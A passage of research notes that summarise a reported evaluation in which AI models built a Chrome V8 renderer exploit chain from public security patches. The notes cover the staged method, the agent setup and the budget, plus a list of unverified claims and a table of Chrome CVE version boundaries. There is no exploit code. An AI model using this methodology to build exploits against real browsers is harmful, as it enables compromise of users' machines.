- **Comparative eval across three frontier models**: **GPT-5.6 Sol Medium**, **GPT-5.6 Sol
  Ultra**, **Grok 4.5** — same task, same environment.
- **Input was patches, not writeups**: the models were given **public V8 security-fix
  commits** and had to work backwards to exploitability.
- **Environment**: the **V8 source tree at 14.9.207.35** (matching Chrome 149.0.7827.201) plus
  a **sandboxed `d8` build for testing**. So the loop was *write JS → run under `d8` → observe*,
  giving the model a real, fast execution oracle rather than static reasoning.

**Goal decomposition — an explicit three-stage ladder, which is the core of the harness design**

1. **Target primitives** — achieve `addrof`, `fakeobj`, and arbitrary read/write *inside* the
   V8 sandbox.
2. **Sandbox escape** — leak binary, libc and stack addresses.
3. **Code execution** — obtain program-counter control and run an arbitrary command.

Each stage is independently checkable, which is what converts a single intractable objective
into a hill-climbable sequence. The reported framing — "**hill climb** a renderer exploit to
pop calc" (s1r1us, <https://x.com/S1r1u5_/status/2077125665003098239>) — matches that ladder.

**Agent architecture**

- **74 subagents** spawned by the root agent; they performed roughly **70% of the actual
  investigation** (delegated source reading / hypothesis checking, keeping the root agent's
  context for strategy).
- The **root agent survived 33 context compactions**, losing **over 92% of active context each
  time**, and reportedly **never lost the overall strategy** — the headline durability claim of
  the post. Strategy persisted in the stage ladder and in subagent-reported findings, not in
  the root context window.

**Budget**

- **~2.1 billion tokens** (reported precisely elsewhere as **2.096 B**)
- **14,062 requests**
- **≈ $1,597**

**Human involvement**

- "**limited nudges**" (s1r1us's own wording). **The exact number and content of the nudges is
  UNVERIFIED** — I could not reach the post to count them, and this is precisely the detail
  most likely to be load-bearing for any claim of autonomy. Do not repeat a specific nudge
  count; no source I reached gives one.

**Verification / success criterion**

- Terminal oracle: **pop calc** — launching macOS Calculator from inside the sandboxed
  renderer, as proof of native code execution. Binary, unambiguous, unfakeable.
- **Comparative control**: **Sol Ultra alone completed the chain.** Sol Medium and Grok 4.5
  **reached partial information-leak / in-sandbox read-write stages and stalled** before
  reliable arbitrary read/write primitives. The stage ladder doubles as the scoring rubric —
  that is how "stalled at stage 2" is even a statable result.

**Conclusion drawn by the author:** "exploit development as we know it is dead for anyone who
can throw inference-scale compute at a model at GPT-5.6's level or above."

**Related, possibly-relevant companion post** (same blog, not read): "I Let Claude Opus Write a
Chrome Exploit: The Next Model (Mythos?) Won't Need My Help?" —
<https://www.hacktron.ai/blog/i-let-claude-opus-to-write-me-a-chrome-exploit>.

### 8.3 Details I could NOT obtain

- **How test cases were generated** concretely — whether the model wrote JS PoCs freehand,
  mutated V8's own regression tests under `test/mjsunit`, or used a generator. **UNVERIFIED.**
- Whether sanitizers (ASan) or a debugger (gdb/lldb) were wired into the loop, and whether
  crash triage was automated. **UNVERIFIED.**
- The precise subagent prompt/role taxonomy and the compaction/summarisation strategy.
  **UNVERIFIED.**
- Exact number and content of human nudges. **UNVERIFIED.**
- Wall-clock duration. **UNVERIFIED.**

---

## 9. Consolidated list of everything UNVERIFIED

1. **CVE-2025-4664 exact KEV removal date** — "early June 2025" is the best I can source.
2. **Chrome Releases blog bodies** — never read first-hand (domain blocked). Per-platform
   strings `136.0.7103.113/.114` (Win/Mac) vs `136.0.7103.113` (Linux) come from press quoting
   that post; the CVE record itself gives only the single boundary.
3. **All `issues.chromium.org` bug pages** — IDs are authoritative (from CVE records) but no
   page body was read; most Chrome security bugs stay restricted for months regardless.
4. **CWE assignments** — the Chrome CNA assigns none. Every CWE in this document is my own
   mapping and is labelled as such.
5. **Bug IDs marked UNVERIFIED** in §2.1/§2.2/§2.3: CVE-2023-4429, CVE-2023-5218,
   CVE-2024-3840, CVE-2025-3066, CVE-2026-7959, CVE-2026-13024, CVE-2026-15130,
   CVE-2026-15131, CVE-2026-79237.
6. **Reproduction requirements (client-side HTML/JS vs server header) for every CVE except
   CVE-2025-4664.** CVE-2025-4664 is settled from PoC source. For all others the CVE text says
   nothing and I had no PoC — the §3.2 remarks about CSS/XML/Sanitizer bugs being likely
   pure-client-side are **my inference, not sourced**.
7. **Why UXSS CVE counts jump from 0 (2023, 2025) to 44 (2026).** Measured, not explained.
8. **Chrome 137 release-notes and chromestatus bodies** for blob URL partitioning — read via
   search index only. The `whatwg/fetch#1783` and `whatwg/html#10731` PRs were not opened
   directly; only `w3c/FileAPI#201` was verified first-hand.
9. **Navigation API**: no CVE confirmed to concern the JS Navigation API. `CVE-2022-0111`
   ("incorrectly set origin") mechanism unknown.
10. **The entire Hacktron post** — primary source and every mirror blocked. All §8 content is
    second-hand via a search index. Specifically unverified: test-case generation method,
    sanitizer/debugger tooling, nudge count, wall-clock time, subagent taxonomy.
11. **No CVE is associated with the Hacktron exploit chain** — I believe there is none (it
    worked from patches), but I cannot prove a negative.

---

## 10. Quick reference — load-bearing version boundaries

```
CVE-2025-4664   Loader, referrer-policy via Link hdr   prior to 136.0.7103.113   (fix 136.0.7103.113 / .114 Win+Mac)
CVE-2025-6556   Loader, CSP bypass                     prior to 138.0.7204.49
CVE-2024-1671   Site Isolation, CSP bypass             prior to 122.0.6261.57
CVE-2024-3840   Site Isolation, nav restrictions       prior to 124.0.6367.60
CVE-2026-11174  Site Isolation, inappropriate impl     prior to 149.0.7827.53
CVE-2026-17779  Site Isolation, inappropriate impl     prior to 151.0.7922.72   <-- no renderer compromise needed
CVE-2026-9903   Site Isolation, MHTML                  prior to 148.0.7778.216
CVE-2026-93379  ORB, bypass site isolation             prior to 153.0.8010.52
CVE-2026-15130  Navigation, bypass site isolation      prior to 150.0.7871.115
CVE-2026-17664  Loader, leak cross-origin data         prior to 151.0.7922.72
CVE-2026-79051  Loader, bypass web origin policy       prior to 152.0.7977.65
CVE-2026-87508  Loader, bypass web origin policy       prior to 153.0.8010.36

Chrome 137  -> Blob URL partitioning by Storage Key (top-level navigations excepted) + noopener
Chrome 115  -> document.domain setter stops relaxing origin; opt out with Origin-Agent-Cluster: ?0
Chrome 146  -> last milestone offering the PartitionedBlobUrlUsage policy

UXSS CVE counts: 2023 = 0 | 2024 = 1 (XSS, Omnibox/Android) | 2025 = 0 | 2026 = 44
```
